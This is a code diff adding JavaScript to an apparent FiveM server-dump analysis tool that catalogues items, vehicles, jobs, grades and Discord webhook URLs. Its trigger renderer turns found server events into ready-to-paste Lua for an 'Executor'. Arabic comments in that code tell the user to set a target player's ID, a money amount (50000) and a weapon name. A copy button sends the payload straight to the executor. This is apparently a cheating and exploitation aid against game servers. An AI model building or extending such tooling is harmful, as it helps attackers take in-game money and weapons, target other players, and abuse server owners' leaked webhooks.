+            <div class="item-code" style="background:${isEmergency ? 'rgba(0,168,255,0.1)' : 'rgba(50,255,126,0.1)'};color:${isEmergency ? '#00a8ff' : '#32ff7e'};">${esc(it.vehData.code)}</div>
+          </div>
+          <div class="item-file">${esc(it.vehData.path.split('/').pop())}</div>`;
+                fragment.appendChild(card);
+            }
+
+            container.appendChild(fragment);
+
+            if (end < items.length) {
+                requestAnimationFrame(() => renderCarsInChunks(items, container, type, end, onDone));
+            } else if (onDone) {
+                onDone();
+            }
+        }
+
+        function renderJobsInChunks(items, container, type, startIndex = 0, onDone = null) {
+            const chunkSize = 50;
+            const end = Math.min(startIndex + chunkSize, items.length);
+            const fragment = document.createDocumentFragment();
+
+            for (let i = startIndex; i < end; i++) {
+                const it = items[i];
+                const card = document.createElement('div');
+                card.className = `item-card`;
+
+                let imgSrc = imageMap[it.jobData.image.toLowerCase()] || '';
+                let fallbackEmoji = '💼';
+
+                if (!imgSrc) {
+                    const jcode = it.jobData.code.toLowerCase();
+                    const jl = it.jobData.label.toLowerCase();
+                    if (jcode.match(/police|sheriff|lssd|bcso|fib|fbi|sast|cop/) || jl.includes('police')) fallbackEmoji = '🚓';
+                    else if (jcode.match(/ambulance|ems|medic|ambo|fire/) || jl.includes('ems')) fallbackEmoji = '🚑';
+                    else if (jcode.match(/mechanic|bennys|lsc|tuner|auto/) || jl.includes('mechanic')) fallbackEmoji = '🔧';
+                    else if (jcode.match(/taxi|uber/)) fallbackEmoji = '🚕';
+                    else if (jcode.match(/burger|pizza|bean|food|cafe|coffee|taco/)) fallbackEmoji = '🍔';
+                    else if (jcode.match(/realestate|estate|house/)) fallbackEmoji = '🏠';
+                    else if (jcode.match(/car|dealer|veh/)) fallbackEmoji = '🚙';
+                    else if (jcode.match(/garbage|trash/)) fallbackEmoji = '🗑️';
+                    else if (jcode.match(/news|reporter|weazel/)) fallbackEmoji = '🎥';
+                    else if (it.jobData.path.toLowerCase().includes('gang')) fallbackEmoji = '🥷';
+                }
+
+                card.innerHTML = `
+          <div class="item-img-container" style="border-color:var(--accent);">
+            ${imgSrc ? `<img src="${imgSrc}" class="item-img" loading="lazy">` : `<span style="font-size:32px; filter: drop-shadow(0 0 8px rgba(255,255,255,0.2));">${fallbackEmoji}</span>`}
+          </div>
+          <div class="item-info">
+            <div class="item-name">${esc(it.jobData.label)}</div>
+            <div class="item-code" style="background:rgba(0,212,255,0.1);color:var(--accent);">${esc(it.jobData.code)}</div>
+          </div>
+          <div class="item-file">${esc(it.jobData.path.split('/').pop())}</div>`;
+                fragment.appendChild(card);
+            }
+
+            container.appendChild(fragment);
+
+            if (end < items.length) {
+                requestAnimationFrame(() => renderJobsInChunks(items, container, type, end, onDone));
+            } else if (onDone) {
+                onDone();
+            }
+        }
+
+        function renderGradesInChunks(items, container, type, startIndex = 0, onDone = null) {
+            const chunkSize = 50;
+            const end = Math.min(startIndex + chunkSize, items.length);
+            const fragment = document.createDocumentFragment();
+
+            for (let i = startIndex; i < end; i++) {
+                const it = items[i];
+                const card = document.createElement('div');
+                card.className = `item-card`;
+
+                let fallbackEmoji = '🎖️';
+                if (it.gradeData.code.toString() === '0') fallbackEmoji = '🔰';
+                if (it.gradeData.code.toString() > '3' || it.gradeData.label.toLowerCase().includes('boss')) fallbackEmoji = '👑';
+
+                card.innerHTML = `
+          <div class="item-img-container" style="border-color:var(--accent);">
+            <span style="font-size:32px; filter: drop-shadow(0 0 8px rgba(255,255,255,0.2));">${fallbackEmoji}</span>
+          </div>
+          <div class="item-info">
+            <div class="item-name">${esc(it.gradeData.label)}</div>
+            <div class="item-code" style="background:rgba(0,212,255,0.1);color:var(--accent);">Rank: ${esc(it.gradeData.code)}</div>
+          </div>
+          <div class="item-file">${esc(it.gradeData.path.split('/').pop())}</div>`;
+                fragment.appendChild(card);
+            }
+
+            container.appendChild(fragment);
+
+            if (end < items.length) {
+                requestAnimationFrame(() => renderGradesInChunks(items, container, type, end, onDone));
+            } else if (onDone) {
+                onDone();
+            }
+        }
+
+        function renderGroupsInChunks(groupEntries, container, type, index = 0) {
+            const chunkSize = 10;
+            const end = Math.min(index + chunkSize, groupEntries.length);
+
+            for (let i = index; i < end; i++) {
+                const [path, items] = groupEntries[i];
+                const groupEl = document.createElement('div');
+                groupEl.className = 'result-group';
+                let itemsHtml = `<div class="result-group-header">📄 ${esc(path)}<span class="rgh-badge">${items.length}</span></div><div class="result-items">`;
+                items.forEach(it => {
+                    
+                    // Smart Extractor for the visual box and Copy Button
+                    let varStr = "";
+                    let isTrigger = false;
+                    if (it.line.includes('TriggerServerEvent') || it.line.includes('TriggerEvent')) {
+                        isTrigger = true;
+                        const varsMatch = it.line.match(/Trigger(?:Server)?Event\s*\(\s*(['"][^'"]+['"])(.*?)\)/i);
+                        if (varsMatch) {
+                            let args = varsMatch[2];
+                            if (args.startsWith(',')) args = args.substring(1).trim();
+                            if (args) {
+                                let vars = args.split(',').map(s => s.trim()).filter(s => s && !s.match(/^['"]/));
+                                let ignoreList = ['nil', 'true', 'false', 'math', 'source', 'table', 'PlayerPedId', 'GetPlayerPed', 'tonumber', 'tostring'];
+                                let uniqueVars = [...new Set(vars)].filter(v => !ignoreList.includes(v) && !v.includes('.'));
+                                if (uniqueVars.length > 0) {
+                                    varStr = `-- Variables setup:\n`;
+                                    uniqueVars.forEach(v => {
+                                        const vl = v.toLowerCase();
+                                        if (vl.includes('target') || vl.includes('player') || vl.includes('id') || vl.includes('src')) {
+                                            varStr += `local ${v} = GetPlayerServerId(PlayerId()) -- ⚠️ غير هذا لأيدي اللاعب المستهدف (مثال: 5)\n`;
+                                        } else if (vl.includes('amount') || vl.includes('count') || vl.includes('price') || vl.includes('money')) {
+                                            varStr += `local ${v} = 50000 -- 💰 ضع الفلوس أو الكمية هنا\n`;
+                                        } else if (vl.includes('item') || vl.includes('weapon')) {
+                                            varStr += `local ${v} = 'weapon_pistol' -- 📦 ضع اسم الغرض أو السلاح هنا\n`;
+                                        } else {
+                                            varStr += `local ${v} = 1 -- ⚙️ غير القيمة حسب الحاجة\n`;
+                                        }
+                                    });
+                                }
+                            }
+                            varStr += `-- Execute Trigger:\n${it.line.trim()}`;
+                        } else {
+                            varStr = `-- Execute Trigger:\n${it.line.trim()}`;
+                        }
+                    } else {
+                        varStr = `-- Execute:\n${it.line.trim()}`;
+                    }
+                    
+                    const cleanRawText = varStr.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/'/g, "\\'").replace(/\n/g, '\\n');
+                    const visualCode = varStr.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+
+                    let triggerCode = '';
+                    
+                    // Show for Register Events
+                    const trigMatch = it.line.match(/(?:RegisterNetEvent|RegisterServerEvent|AddEventHandler)\s*\(\s*['"]([^'"]+)['"]/i);
+                    if (trigMatch && trigMatch[1]) {
+                        triggerCode = `<div style="margin-top:6px;padding:8px;background:rgba(0, 212, 255, 0.08);border-left:3px solid var(--accent);border-radius:6px;font-family:var(--mono);font-size:11px;color:var(--text);width:100%;">
+                            <strong style="color:var(--accent);font-size:10px;text-transform:uppercase;margin-bottom:4px;display:block;">كيف تستخدمه في الـ Executor 🚀:</strong>
+                            <div style="margin-bottom:3px;color:#a0aabf;">-- إذا كان ترجير سيرفر (مسؤول عن الفلوس والأغراض):</div>
+                            <div style="user-select:all;color:#fff;margin-bottom:6px;background:rgba(0,0,0,0.3);padding:4px;border-radius:4px;cursor:pointer;">TriggerServerEvent('${esc(trigMatch[1])}')</div>
+                            <div style="margin-bottom:3px;color:#a0aabf;">-- إذا كان ترجير كلينت (مسؤول عن القوائم والشاشة):</div>
+                            <div style="user-select:all;color:#fff;background:rgba(0,0,0,0.3);padding:4px;border-radius:4px;cursor:pointer;">TriggerEvent('${esc(trigMatch[1])}')</div>
+                        </div>`;
+                    } else if (isTrigger) {
+                        // Show for Trigger Events
+                        triggerCode = `<div style="margin-top:6px;padding:8px;background:rgba(255, 165, 2, 0.08);border-left:3px solid #ffa502;border-radius:6px;font-family:var(--mono);font-size:11px;color:var(--text);width:100%;">
+                            <strong style="color:#ffa502;font-size:10px;text-transform:uppercase;margin-bottom:4px;display:block;">شرح الاستخدام في الـ Executor 🚀:</strong>
+                            <div style="margin-bottom:3px;color:#a0aabf;">-- كود الـ Lua جاهز للاستخدام مع المتغيرات:</div>
+                            <div style="user-select:all;color:#fff;background:rgba(0,0,0,0.3);padding:6px;border-radius:4px;cursor:pointer;white-space:pre-wrap;">${visualCode}</div>
+                        </div>`;
+                    }
+
+                    itemsHtml += `<div class="result-item" style="flex-direction:column;align-items:flex-start;gap:4px;">
+                        <div style="display:flex;gap:14px;width:100%;align-items:center;">
+                            <span class="line-num">${it.num}</span>
+                            <span class="line-code" style="flex:1;">${highlight(it.line, it.matched, type)}</span>
+                            <button class="btn" style="padding:4px 8px; font-size:10px; background:var(--surface3); color:#fff; flex-shrink:0; margin-left:10px;" onclick="copyToExecutor('${cleanRawText}')">📋 Copy</button>
+                        </div>
+                        ${triggerCode}
+                    </div>`;
+
+
+                });
+                itemsHtml += `</div>`;
+                groupEl.innerHTML = itemsHtml;
+                container.appendChild(groupEl);
+            }
+
+            if (end < groupEntries.length) {
+                requestAnimationFrame(() => renderGroupsInChunks(groupEntries, container, type, end));
+            }
+        }
+
+        function runSearch(patterns, title, type, filter) {
+            if (!files.length) { setStatus('⚠ Load files first', ''); return; }
+            setStatus('Searching...', 'searching');
+            setTimeout(() => { renderResults(doSearch(patterns, filter), title, type); setStatus('Done', 'active'); }, 10);
+        }
+
+        function runDynamic() { runSearch(DYNAMIC, 'Dynamic Triggers', 'dyn') }
+
+        function runWebhooks() {
+            if (!files.length) { setStatus('⚠ Load files first', ''); return; }
+            setStatus('Finding Webhooks...', 'searching');
+            setTimeout(() => {
+                const out = {};
+                // Exact discord.com/api/webhooks/ regex capturing the rest of the url
+                const urlRegex = /((?:https?:\/\/)?(?:ptb\.|canary\.)?(?:discord|discordapp)\.com\/api\/webhooks\/[^\s'"`,\)\]}]+)/gi;
+
+                files.forEach(f => {
+                    f.lines.forEach((line, i) => {
+                        let match;
+
+                        // Loop through explicit webhook links in the line
+                        while ((match = urlRegex.exec(line)) !== null) {
+                            if (!out[f.path]) out[f.path] = [];
+                            const extractedUrl = match[1];
+                            out[f.path].push({ num: i + 1, line: extractedUrl, matched: [extractedUrl] });
+                        }
+                    });
+                });
+
+                renderResults(out, 'Discord Webhooks', 'web');
+                setStatus('Done', 'active');
+            }, 10);
+        }
+
+        function runItems() {
+            if (!files.length) { setStatus('⚠ Load files first', ''); return; }
+            setStatus('Finding ONLY Real Inventory Items...', 'searching');
+            setTimeout(() => {
+                const results = {};
+                const globalStore = new Map();
+
+                // Directories completely irrelevant to items
+                const skipFiles = ['stream', 'map', 'ui/', 'ui\\', 'html/', 'html\\', 'web/', 'web\\', 'node_modules', 'locales/', 'locales\\', 'locale/', 'locale\\', 'lang/', 'lang\\'];
+                const isSkipFile = (p) => skipFiles.some(s => p.includes(s)) || p.endsWith('.sql') || p.endsWith('.json') || p.endsWith('.md');
+
+                files.forEach(f => {
+                    const pathLower = f.path.toLowerCase();
+                    if (isSkipFile(pathLower)) return;
+
+                    f.lines.forEach((line, i) => {
+                        let matches = [];
+
+                        // 1. Core API Calls (100% Certainty)
+                        const pApi = line.match(/(?:RegisterUsableItem|CreateUsableItem|AddItem|RemoveItem|HasItem|Inventory\.Add|Inventory\.Has|Inventory:AddItem)\s*\(\s*['"]([a-zA-Z0-9_\-]+)['"]/i);
+                        if (pApi) matches.push({ code: pApi[1], isStrict: true });
+
+                        // 2. Weapon Codes (100% Certainty)
+                        const pWep = line.match(/['"](weapon_[a-zA-Z0-9_]+)['"]/i);
+                        if (pWep) matches.push({ code: pWep[1], isStrict: true });
+
+                        // 3. Official Tables Config.Items.water (100% Certainty)
+                        const pItemDef = line.match(/(?:Config\.|Shared\.|QBShared\.|ESX\.|Inventory\.)(?:Items|Weapons|ItemList|SharedItems)\.([a-zA-Z0-9_\-]+)/i);
+                        if (pItemDef) matches.push({ code: pItemDef[1], isStrict: true });
+
+                        // 4. Block Definitions: ['item_name'] = { 
+                        const pBlockKey = line.match(/\[\s*['"]([a-zA-Z0-9_\-]+)['"]\s*\]\s*(?:=\s*)?\{/);
+                        if (pBlockKey) matches.push({ code: pBlockKey[1], isStrict: false });
+
+                        // 5. Variable Definitions: local item = {
+                        const pVar = line.match(/^\s*(?:local\s+)?([a-zA-Z0-9_\-]+)\s*(?:=\s*)?\{/);
+                        if (pVar) matches.push({ code: pVar[1], isStrict: false });
+
+                        // 6. Inline name: name = 'item_name'
+                        const pName = line.match(/name\s*=\s*['"]([a-zA-Z0-9_\-]+)['"]/i);
+                        if (pName) matches.push({ code: pName[1], isStrict: false });
+
+                        matches.forEach(m => {
+                            const code = m.code;
+                            if (!code || code.length < 2 || code.includes(' ') || !isNaN(code)) return;
+                            const lower = code.toLowerCase();
+                            if (lower.length > 50) return;
+
+                            // Stop decompiler garbage L12_3
+                            if (/^[LAF]\d+(_\d+)?$/i.test(code)) return;
+
+                            let label = null, image = null;
+                            let hasWeight = false, hasTypeItem = false, hasWeaponProps = false;
+
+                            // Scan ONLY the current object block
+                            for (let j = 0; j < 25; j++) {
+                                if (i + j >= f.lines.length) break;
+                                const l = f.lines[i + j];
+
+                                // Breaking conditions to prevent bleeding into next items:
+                                if (j > 0) {
+                                    if (l.match(/\[\s*['"][a-zA-Z0-9_\-]+['"]\s*\]\s*=\s*\{/)) break; // Another table key
+                                    if (l.match(/(?:^|\s+)(?:local\s+)?[a-zA-Z0-9_\.]+\s*=\s*\{/)) break; // Another config root
+                                    if (l.match(/^\s*['"][a-zA-Z0-9_\-]+['"]\s*,?\s*$/)) break; // Another item in string array
+                                    if (j > 2 && l.match(/^\s*\}\s*,?\s*$/)) break; // Block end
+                                }
+
+                                if (!label) {
+                                    const mLabel = l.match(/label['"]?\s*\]?\s*=\s*['"](.*?)['"]/i);
+                                    if (mLabel) label = mLabel[1];
+                                }
+                                if (!image) {
+                                    const mImg = l.match(/image['"]?\s*\]?\s*=\s*['"](.*?)['"]/i);
+                                    if (mImg) image = mImg[1];
+                                }
+
+                                // STRICT INVENTORY SIGNATURES: (Matches weight = 500, ['weight'] = 500)
+                                if (l.match(/(?:weight|limit)['"]?\s*\]?\s*=\s*-?\d*\.?\d+/i)) hasWeight = true;
+                                if (l.search(/['"]?type['"]?\s*\]?\s*=\s*['"]?(?:item|weapon|consumable)['"]?/i) !== -1) hasTypeItem = true;
+                                if (l.match(/(?:ammotype|decay|degrade|rarity|combinable)['"]?\s*\]?\s*=/i)) hasWeaponProps = true;
+                                if (l.match(/(?:description|desc|info)['"]?\s*\]?\s*=/i) && label) hasTypeItem = true;
+                            }
+
+                            const isItemsFile = pathLower.includes('items.lua') || pathLower.includes('shared.lua');
+
+                            // IS IT TRULY AN ITEM?
+                            // YES IF: 
+                            // 1. Used in AddItem() or weapon_ string.
+                            // 2. Contains weight = [number] inside its block.
+                            // 3. Contains type = 'item' inside its block.
+                            // 4. Contains weapon specific properties inside its block.
+                            // 5. Is inside an `items.lua` file AND has a label.
+                            const isValid = m.isStrict || hasWeight || hasTypeItem || hasWeaponProps || (label && image) || (isItemsFile && label);
+
+                            if (isValid) {
+                                const itemData = {
+                                    code: code,
+                                    label: label || code.replace(/_/g, ' ').toUpperCase(),
+                                    image: image || (lower + '.png'),
+                                    path: f.path,
+                                    num: i + 1,
+                                    hasLabel: !!label
+                                };
+
+                                const existing = globalStore.get(lower);
+                                if (!existing || (!existing.hasLabel && label)) {
+                                    globalStore.set(lower, itemData);
+                                }
+                            }
+                        });
+                    });
+                });
+
+                // Final cleanup of reserved lua/config words that might sneak mathematically
+                const finalResults = {};
+                const reservedWords = ['index', 'type', 'name', 'label', 'weight', 'description', 'image', 'info', 'id', 'amount', 'metadata', 'money', 'cash', 'bank', 'crypto', 'es_extended', 'qb-core', 'ox_lib', 'game', 'password', 'bg', 'data', 'totable'];
+
+                globalStore.forEach(item => {
+                    if (reservedWords.includes(item.code.toLowerCase())) return;
+                    if (!finalResults[item.path]) finalResults[item.path] = [];
+                    finalResults[item.path].push({ num: item.num, itemData: item });
+                });
+
+                renderResults(finalResults, 'Verified Inventory Items', 'item');
+                setStatus('Analysis Complete', 'active');
+            }, 10);
+        }
+
+        function runVehicles() {
+            if (!files.length) { setStatus('⚠ Load files first', ''); return; }
+            setStatus('Finding Server Vehicles...', 'searching');
+            setTimeout(() => {
+                const globalStore = new Map();
+
+                const skipFiles = ['stream', 'map', 'ui/', 'ui\\', 'html/', 'html\\', 'web/', 'web\\', 'node_modules', 'locales/', 'locales\\', 'locale/', 'locale\\', 'lang/', 'lang\\'];
+                const isSkipFile = (p) => skipFiles.some(s => p.includes(s)) || p.endsWith('.sql') || p.endsWith('.json') || p.endsWith('.md');
+
+                files.forEach(f => {
+                    const pathLower = f.path.toLowerCase();
+                    if (isSkipFile(pathLower)) return;
+
+                    f.lines.forEach((line, i) => {
+                        let matches = [];
+
+                        const pBlockKey = line.match(/\[\s*['"]([a-zA-Z0-9_\-]+)['"]\s*\]\s*(?:=\s*)?\{/);
+                        if (pBlockKey) {
+                            const explicitVeh = line.match(/(?:Vehicles|Cars|SharedVehicles)\s*\[/i);
+                            matches.push({ code: pBlockKey[1], explicitVeh: !!explicitVeh });
+                        }
+
+                        matches.forEach(m => {
+                            const code = m.code;
+                            if (!code || code.length < 2 || code.includes(' ') || !isNaN(code)) return;
+                            const lower = code.toLowerCase();
+                            if (lower.length > 50) return;
+
+                            let make = null, name = null, category = null;
+                            let hasModel = false, hasType = false;
+
+                            const lookStart = Math.max(0, i - 1);
+                            const lookEnd = Math.min(f.lines.length, i + 25);
+
+                            for (let j = lookStart; j < lookEnd; j++) {
+                                const l = f.lines[j];
+
+                                if (j > i + 1 && l.match(/\[\s*['"][a-zA-Z0-9_\-]+['"]\s*\]\s*=\s*\{/)) break;
+
+                                if (!name) {
+                                    const mName = l.match(/name['"]?\s*\]?\s*=\s*['"](.*?)['"]/i);
+                                    if (mName) name = mName[1];
+                                }
+                                if (!make) {
+                                    const mMake = l.match(/(?:make|brand)['"]?\s*\]?\s*=\s*['"](.*?)['"]/i);
+                                    if (mMake) make = mMake[1];
+                                }
+                                if (!category) {
+                                    const mCat = l.match(/category['"]?\s*\]?\s*=\s*['"](.*?)['"]/i);
+                                    if (mCat) category = mCat[1];
+                                }
+
+                                if (l.match(/(?:model|hash)['"]?\s*\]?\s*=/i)) hasModel = true;
+                                if (l.match(/type['"]?\s*\]?\s*=\s*['"](?:automobile|bike|boat|heli|plane|submarine|trailer|train)['"]/i)) hasType = true;
+                            }
+
+                            let isVehicle = false;
+                            if (m.explicitVeh) isVehicle = true;
+                            if (hasType) isVehicle = true;
+                            // Must have a model hash AND (a vehicle brand OR a shop category) to be considered a vehicle, skipping normal items that have a 'model' prop.
+                            if (hasModel && (make || category)) isVehicle = true;
+                            if (pathLower.includes('vehicles.lua') && (name || hasModel)) isVehicle = true;
+
+                            // Force cancel if it's deeply suspicious
+                            if (code.toLowerCase().startsWith('prop_') || code.toLowerCase().startsWith('weapon_')) isVehicle = false;
+                            if (category && category.toLowerCase() === 'item') isVehicle = false;
+
+                            if (isVehicle) {
+                                const vehicleData = {
+                                    code: code,
+                                    name: name || code.toUpperCase(),
+                                    make: make || '',
+                                    category: category || 'Uncategorized',
+                                    image: lower + '.png',
+                                    path: f.path,
+                                    num: i + 1
+                                };
+                                globalStore.set(lower, vehicleData);
+                            }
+                        });
+                    });
+                });
+
+                const finalResults = {};
+                const reservedWords = ['index', 'type', 'name', 'label', 'weight', 'description', 'image', 'info', 'id', 'amount', 'metadata', 'money', 'cash', 'bank', 'crypto', 'es_extended', 'qb-core', 'ox_lib', 'game', 'model', 'brand', 'hash', 'price', 'category'];
+
+                globalStore.forEach(veh => {
+                    if (reservedWords.includes(veh.code.toLowerCase())) return;
+                    if (!finalResults[veh.path]) finalResults[veh.path] = [];
+                    finalResults[veh.path].push({ num: veh.num, vehData: veh });
+                });
+
+                renderResults(finalResults, 'Master Vehicle Database', 'vehicle');
+                setStatus('Analysis Complete', 'active');
+            }, 10);
+        }
+
+        function runJobs() {
+            if (!files.length) { setStatus('⚠ Load files first', ''); return; }
+            setStatus('Finding Server Jobs...', 'searching');
+            setTimeout(() => {
+                const globalStore = new Map();
+
+                const skipFiles = ['stream', 'map', 'ui/', 'ui\\', 'html/', 'html\\', 'web/', 'web\\', 'node_modules'];
+                const isSkipFile = (p) => skipFiles.some(s => p.includes(s)) || p.includes('locales') || p.includes('locale') || p.includes('lang') || p.match(/\/(en|ar|fr|es|de)\.lua$/) || p.endsWith('.json') || p.endsWith('.md');
+
+                files.forEach(f => {
+                    const pathLower = f.path.toLowerCase();
+                    if (isSkipFile(pathLower)) return;
+
+                    const isSqlFile = pathLower.endsWith('.sql');
+
+                    f.lines.forEach((line, i) => {
+                        let matches = [];
+
+                        let pBlockKey = line.match(/(?:(?:QBShared\.|Shared\.)?(?:Jobs|Gangs)\s*\[\s*['"]([a-zA-Z0-9_\-]+)['"]\s*\]|\[\s*['"]([a-zA-Z0-9_\-]+)['"]\s*\]\s*(?:=\s*)?\{)/i);
+
+                        if (!pBlockKey && (pathLower.includes('jobs.lua') || pathLower.includes('gangs.lua') || pathLower.includes('config'))) {
+                            const simpleKey = line.match(/^\s*([a-zA-Z0-9_\-]+)\s*=\s*\{/);
+                            if (simpleKey && simpleKey[1] !== 'Config' && simpleKey[1] !== 'Locales') {
+                                pBlockKey = [null, simpleKey[1]];
+                            }
+                        }
+
+                        if (pBlockKey) {
+                            const codeStr = pBlockKey[1] || pBlockKey[2];
+                            const explicitJob = line.match(/(?:Jobs|SharedJobs|Gangs)\s*\[/i);
+                            matches.push({ code: codeStr, explicitJob: !!explicitJob });
+                        }
+
+                        if (isSqlFile) {
+                            const sqlLine = line.match(/INSERT\s+INTO\s+['"`]?(?:jobs|job_grades|gangs|gang_grades)['"`]?.*?VALUES.*?['"`]([a-zA-Z0-9_\-]+)['"`]/i);
+                            const sqlMulti = line.match(/^\s*\(\s*['"`]([a-zA-Z0-9_\-]+)['"`]\s*,/i);
+                            if (sqlLine) {
+                                matches.push({ code: sqlLine[1], explicitJob: true });
+                            } else if (sqlMulti && (pathLower.includes('job') || pathLower.includes('gang') || pathLower.includes('esx'))) {
+                                matches.push({ code: sqlMulti[1], explicitJob: true });
+                            }
+                        }
+
+                        matches.forEach(m => {
+                            const code = m.code;
+                            if (!code || code.length < 2 || code.includes(' ') || !isNaN(code)) return;
+                            const lower = code.toLowerCase();
+                            if (lower.length > 50) return;
+
+                            let label = null, hasGrades = false, type = null;
+
+                            const lookStart = Math.max(0, i - 1);
+                            const lookEnd = Math.min(f.lines.length, i + 35);
+
+                            for (let j = lookStart; j < lookEnd; j++) {
+                                const l = f.lines[j];
+
+                                if (j > i + 2 && l.match(/\[\s*['"][a-zA-Z0-9_\-]+['"]\s*\]\s*=\s*\{/)) break;
+
+                                if (!label) {
+                                    const mLabel = l.match(/label['"]?\s*\]?\s*=\s*['"](.*?)['"]/i);
+                                    if (mLabel) label = mLabel[1];
+                                }
+                                if (!type) {
+                                    const mType = l.match(/type['"]?\s*\]?\s*=\s*['"](.*?)['"]/i);
+                                    if (mType) type = mType[1];
+                                }
+
+                                if (l.match(/(?:grades|onduty|offduty|salary)['"]?\s*\]?\s*=/i)) hasGrades = true;
+                                if (l.match(/['"]0['"]\s*=\s*\{/i) && l.match(/name/i)) hasGrades = true;
+                            }
+
+                            let isJob = false;
+                            if (m.explicitJob) isJob = true;
+                            if (hasGrades) isJob = true;
+                            if (pathLower.includes('jobs.lua') && (label || hasGrades)) isJob = true;
+                            if (pathLower.includes('gangs.lua')) isJob = true;
+
+                            if (code.toLowerCase().startsWith('weapon_') || code.toLowerCase().startsWith('prop_')) isJob = false;
+
+                            const falsePositives = ['vehicles', 'items', 'attachments', 'authorizedjobgrades', 'outfits', 'police-outfits', 'locations', 'blips', 'markers', 'peds', 'vehicleshop', 'armory', 'bossmenu', 'cloakroom', 'vehiclesspawn', 'discord', 'mechanic', 'police', 'ambulance'];
+
+                            if (falsePositives.includes(lower) && !m.explicitJob && !hasGrades) isJob = false;
+
+                            // Only strictly block uppercase noise if it isn't explicitly defined as a job
+                            if (code === code.toUpperCase() && code.length > 3 && !m.explicitJob && !pathLower.includes('gangs.lua')) {
+                                if (!label) isJob = false;
+                            }
+
+                            if (code.length === 1) isJob = false;
+
+                            if (isJob) {
+                                const jobData = {
+                                    code: code,
+                                    label: label || code.replace(/_/g, ' ').toUpperCase(),
+                                    type: type || 'job',
+                                    image: lower + '.png',
+                                    path: f.path,
+                                    num: i + 1
+                                };
+                                globalStore.set(lower, jobData);
+                            }
+                        });
+                    });
+                });
+
+                const finalResults = {};
+                const reservedWords = ['index', 'type', 'name', 'label', 'weight', 'description', 'image', 'info', 'id', 'amount', 'metadata', 'money', 'cash', 'bank', 'crypto', 'es_extended', 'qb-core', 'ox_lib', 'game', 'model', 'brand', 'hash', 'price', 'category', 'grades', 'salary'];
+
+                globalStore.forEach(job => {
+                    if (reservedWords.includes(job.code.toLowerCase())) return;
+                    if (!finalResults[job.path]) finalResults[job.path] = [];
+                    finalResults[job.path].push({ num: job.num, jobData: job });
+                });
+
+                renderResults(finalResults, 'Master Job Database', 'job');
+                setStatus('Analysis Complete', 'active');
+            }, 10);
+        }
+
+        function runGrades() {
+            if (!files.length) { setStatus('⚠ Load files first', ''); return; }
+            setStatus('Finding Job Ranks...', 'searching');
+            setTimeout(() => {
+                const globalStore = {};
+
+                const skipFiles = ['stream', 'map', 'ui/', 'ui\\', 'html/', 'html\\', 'web/', 'web\\', 'node_modules'];
+                const isSkipFile = (p) => skipFiles.some(s => p.includes(s)) || p.includes('locales') || p.includes('locale') || p.includes('lang') || p.match(/\/(en|ar|fr|es|de)\.lua$/) || p.endsWith('.json') || p.endsWith('.md');
+
+                files.forEach(f => {
+                    const pathLower = f.path.toLowerCase();
+                    if (isSkipFile(pathLower)) return;
+
+                    const isSqlFile = pathLower.endsWith('.sql');
+
+                    let currentJob = 'Unknown Job';
+                    let inGradesBlock = false;
+
+                    f.lines.forEach((line, i) => {
+                        // Find Job context
+                        let jMatch = line.match(/(?:(?:QBShared\.|Shared\.)?(?:Jobs|Gangs)\s*\[\s*['"]([a-zA-Z0-9_\-]+)['"]\s*\]|\[\s*['"]([a-zA-Z0-9_\-]+)['"]\s*\]\s*(?:=\s*)?\{)/i);
+
+                        if (jMatch) {
+                            currentJob = jMatch[1] || jMatch[2];
+                        }
+
+                        let simpleKey = line.match(/^\s*([a-zA-Z0-9_\-]+)\s*=\s*\{/);
+                        if (simpleKey && simpleKey[1] !== 'Config' && simpleKey[1] !== 'Locales' && simpleKey[1] !== 'grades' && !line.includes('grades =')) {
+                            // Ignore standard configs so they don't hijack job name
+                            const lowerKey = simpleKey[1].toLowerCase();
+                            const noiseKeys = ['vehicles', 'items', 'attachments', 'authorizedjobgrades', 'outfits', 'police-outfits', 'locations', 'blips', 'markers', 'peds', 'vehicleshop', 'armory', 'bossmenu', 'cloakroom', 'vehiclesspawn'];
+                            if (!noiseKeys.includes(lowerKey)) {
+                                currentJob = simpleKey[1];
+                            }
+                        }
+
+                        if (isSqlFile) {
+                            const sqlFallback = line.match(/\(['"`]([a-zA-Z0-9_\-]+)['"`]\s*,\s*([0-9]+)\s*,\s*['"`](.*?)['"`]\s*,\s*['"`](.*?)['"`]/i);
+                            if (sqlFallback && pathLower.includes('grade')) {
+                                let job = sqlFallback[1];
+                                let code = sqlFallback[2];
+                                let label = sqlFallback[4];
+                                if (!globalStore[job]) globalStore[job] = [];
+                                globalStore[job].push({ code: code, label: label, path: f.path, num: i + 1 });
+                            }
+                        }
+
+                        if (line.match(/grades\s*=\s*\{/i)) {
+                            inGradesBlock = true;
+                        }
+
+                        if (inGradesBlock) {
+                            if (jMatch) { inGradesBlock = false; return; } // exited block
+
+                            let gradeCodeMatch = line.match(/\[\s*['"]?([a-zA-Z0-9_\-]+)['"]?\s*\]\s*=\s*\{/i);
+                            let simpleGradeMatch = line.match(/^\s+([a-zA-Z0-9_\-]+)\s*=\s*\{/i);
+
+                            let gradeCode = null;
+                            if (gradeCodeMatch) gradeCode = gradeCodeMatch[1];
+                            else if (simpleGradeMatch) gradeCode = simpleGradeMatch[1];
+
+                            if (gradeCode && gradeCode.toLowerCase() !== 'grades') {
+                                let label = null;
+                                for (let j = 0; j < 15; j++) {
+                                    if (i + j >= f.lines.length) break;
+                                    let look = f.lines[i + j];
+                                    if (j > 0 && look.match(/\[\s*['"]?([a-zA-Z0-9_\-]+)['"]?\s*\]\s*=\s*\{/i)) break;
+                                    const mLabel = look.match(/name['"]?\s*\]?\s*=\s*['"](.*?)['"]/i) || look.match(/label['"]?\s*\]?\s*=\s*['"](.*?)['"]/i);
+                                    if (mLabel) { label = mLabel[1]; break; }
+                                }
+
+                                if (label) {
+                                    const jobNameClean = currentJob.replace(/_/g, ' ').toUpperCase();
+                                    if (!globalStore[jobNameClean]) globalStore[jobNameClean] = [];
+                                    if (!globalStore[jobNameClean].some(g => g.code === gradeCode)) {
+                                        globalStore[jobNameClean].push({ code: gradeCode, label: label, path: f.path, num: i + 1 });
+                                    }
+                                }
+                            }
+                        }
+                    });
+                });
+
+                const finalResults = {};
+                Object.entries(globalStore).forEach(([job, grades]) => {
+                    if (job.length > 30 || grades.length === 0) return;
+                    if (!finalResults[job]) finalResults[job] = [];
+                    grades.forEach(g => finalResults[job].push({ num: g.num, gradeData: g, jobName: job }));
+                });
+
+                renderResults(finalResults, 'Master Job Grades', 'grade');
+                setStatus('Analysis Complete', 'active');
+            }, 10);
